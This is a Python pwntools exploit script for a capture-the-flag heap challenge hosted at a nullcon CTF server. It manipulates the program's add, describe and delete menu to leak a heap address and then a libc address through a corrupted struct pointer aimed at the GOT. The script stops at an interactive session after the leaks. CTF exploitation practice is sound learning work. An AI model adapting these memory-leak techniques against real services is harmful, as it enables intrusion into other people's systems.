#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('challenge4')

host = args.HOST or 'pwn.ctf.nullcon.net'
port = int(args.PORT or 4003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ["gnome-terminal", "-e"]
io = start()

if args.LOCAL:
    libc = ELF('/lib64/libc.so.6')
else:
    libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')

def _snd(p, msg):
    io.sendafter(str(p), str(msg))

def _sndl(p, msg):
    io.sendlineafter(str(p), str(msg))

def add(s):
    _sndl('>', 1)
    _sndl(':', s)

def descr(s, l, d):
    _sndl('>', 2)
    _sndl(':', s)
    _sndl(':', l)
    if l > 0xff: return
    _sndl(':', d)

def delete(s):
    _sndl('>', 3)
    _sndl(':', s)

def view():
    _sndl('>', 4)

add("0" * 0X40)
descr("0"*0x40, 0x5, "0000")

# heap lea
add("A" * 0x40)
descr("A" * 0x40, 0x40, "abc")
add("B" * 0x40)

delete("B" * 0x40)
descr("A" * 0x40, 999, "abc")
view()
io.recvuntil(' - ')
heap = io.recvline().strip()
heap = heap + (8 - len(heap)) * "\x00"
heap = u64(heap) - 224
log.success("heap (first chunk data): {}".format(hex(heap)))

# libc leak
descr("A" * 0x40, 16, "XXXX")

descr("A" * 0x40, 999, "")
descr("A" * 0x40, 999, "")

symb = 'puts'
add("C" * 0x40)
descr("C" * 0x40, 0x10, p64(exe.got[symb]) + p64(heap + 512 + 16)) # modify struct of C
log.info("{}".format(hex(heap + 512 + 16)))
view()
io.recvuntil('AAAA')
io.recvline()
addr = io.recvuntil(' - ').replace(' - ', '')
addr = addr + (8 - len(addr)) * "\x00"
name = addr
addr = u64(addr) - libc.symbols[symb]
libc.addr = addr
log.success("libc: {}".format(hex(addr)))



io.interactive()

